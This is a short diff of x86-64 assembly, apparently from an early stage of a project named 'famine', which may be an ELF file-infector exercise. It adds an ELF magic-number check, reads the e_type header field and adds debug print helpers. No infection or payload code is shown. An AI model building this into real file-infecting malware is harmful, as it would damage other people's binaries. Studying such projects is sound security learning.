@@ -62,10 +62,20 @@ main:
 	syscall
 
 
-	; TEST
+	; === Make sure the file is an ELF file ===
 	mov rax, FAM(famine.map_ptr)
-	mov al, BYTE [rax]
-	cmp al, 0x7f
+	mov dword eax, [rax]
+	cmp eax, 0x464c457f
+	jne _error_exit
+
+	; === Make sure the ELF file is x64 ===
+	mov rax, FAM(famine.map_ptr)
+	add rax, elf64_ehdr.e_type
+	mov word di, [rax]
+	xor rax, rax
+	mov ax, di
+	write_format pointer, rax
+	
 
 
 
@@ -99,3 +109,20 @@ num			db		"[*] %d",0x0a,0x0
 hex			db		"[*] %x",0x0a,0x0
 pointer		db		"[*] %p",0x0a,0x0
 char		db		"[*] %c",0x0a,0x0
+
+
+
+
+; === USEFUL STUFF ===
+
+
+
+; -> Printing each byte as char from a memory location
+;	mov rax, FAM(famine.map_ptr)
+;	write_format char, [rax]
+;	inc rax
+;	write_format char, [rax]
+;	inc rax
+;	write_format char, [rax]
+;	inc rax
+;	write_format char, [rax]
